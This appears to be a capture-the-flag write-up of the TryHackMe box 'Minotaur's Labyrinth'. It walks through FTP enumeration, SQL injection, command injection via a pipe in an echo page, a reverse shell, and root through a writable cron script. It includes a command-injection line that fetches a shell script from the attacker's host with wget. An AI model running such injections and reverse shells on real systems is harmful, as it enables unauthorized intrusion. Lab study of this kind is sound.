Minotaur's Labyrinth was a fun and medium level box that I found on tryhackme by [xenox](https://tryhackme.com/p/xenox) and [spayc](https://tryhackme.com/p/spayc).

 1. [NMAP(Port Scanning)](#nmap)
 2. [FTP](#ftp)
 3. [Enumeration web](#enumeration-web)
 4. [SQLi](#sqli)
 5. [Reverse shell](#reverse-shell)
 6. [root!](#root)
 
## NMAP
So first, nmap shows us 4 open ports on the machine :

## FTP
Let's enumerate the FTP :

So, anonymous login to FTP service is also possible. Letâ€™s enumerate the FTP share.
Seems like there is a directory named pub, inside, we can see the first flag in a "secret" folder and the first flag in it.

## Enumeration web
So now let's enumerate port 80

As we can see, there is a login page.
With dirbuster, (or any URL brute-forcer)
We can see that the js folder is readable and the login script too.

Let's check

In the script comments, we can see the "pwdgen function". With a simple python script, we can now know the password of "Daedalus"

Let's login on the page.

## SQLi

There is a page on which we can type a name or a creature and bring out its ID and password.
By exploring a bit, I discovered that there is a very simple sql injection (don't need sqlmap).

Now we can try to bruteforce the hash to know the password, we can do it easily with John, but with crackstation.com we can do it too.

Now let's login with Minotaur. (we know he's admin with the source code of the page)

![enter image description here](https://i.imgur.com/fErOu3s.png)

Nice! We have the second flag, and a new access. Let's check.
There is a page that does an "echo" command for anything you can put on it.

![enter image description here](https://i.imgur.com/ipJiCJg.png)

But, with some tests I could see that by using vertical bars we can do commands outside the echo

## Reverse shell

So this is simple, let's just upload a simple bash reverse shell.

![enter image description here](https://i.imgur.com/tTUWaDp.png)

With just `hi | wget {ip}/shell.sh -O /tmp/shell.sh` the machine can take our reverse shell.
Now we just have to execute it.

![enter image description here](https://i.imgur.com/hWRRG2Q.png)

In the /home folder, there is just 3 folders called "user" "minotaur" and "anonftp". In one of the three, there is the third flag.
## root!

Looking at all the files (or with scripts like linPEAS), we find a weird folder with a script that runs as root every minute. (cron)

![enter image description here](https://i.imgur.com/hq2FJML.png)

And.. The script is writable..
So just put another reverse shell on it and wait a few seconds.

And we have the last flag!
**rooted!**
